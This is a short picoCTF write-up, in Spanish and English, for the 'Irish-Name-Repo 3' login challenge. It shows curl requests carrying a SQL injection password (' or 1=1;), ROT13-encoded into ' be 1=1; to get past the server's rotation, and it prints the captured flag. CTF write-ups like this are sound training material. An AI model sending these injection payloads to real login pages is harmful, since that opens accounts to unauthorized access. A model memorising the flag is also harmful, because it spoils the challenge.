# Irish-Name-Repo 3
## Objetivo
There is a secure website running at `https://jupiter.challenges.picoctf.org/problem/54253/` ([link](https://jupiter.challenges.picoctf.org/problem/54253/)) or http://jupiter.challenges.picoctf.org:54253. Try to see if you can login as admin!

## Datos de Acceso al Nivel
```
```
## Solucion
```Bash
abrir link
intentar logearse como admin
inspeccionar pagina login
buscar los elementos del login
mostrar el cuadro de debug
curl https://jupiter.challenges.picoctf.org/problem/33850/login.php -d "username=admin&password=admin or 1=1;&debug=1"

modificar password con la inyeccion 1=1
curl https://jupiter.challenges.picoctf.org/problem/33850/login.php -d "username=admin&password=' or 1=1;&debug=1"

verificar la rotacion del passord con cyberchef usando rot 13
" ' or 1=1; = ' be 1=1; " 

enviar como password la rotacion.
curl https://jupiter.challenges.picoctf.org/problem/54253/login.php -d "username=admin&password=' be 1=1;&debug=1"
copiar flag
picoCTF{3v3n_m0r3_SQL_7f5767f6}
```
## Notas Adicionales
|**Comandos**|**Descripcion**|
|--------|-------------|
|||
|||
## Referencias
* https://gchq.github.io/CyberChef/#recipe=ROT13(true,true,false,13)&input=JyBiZSAxPTE7

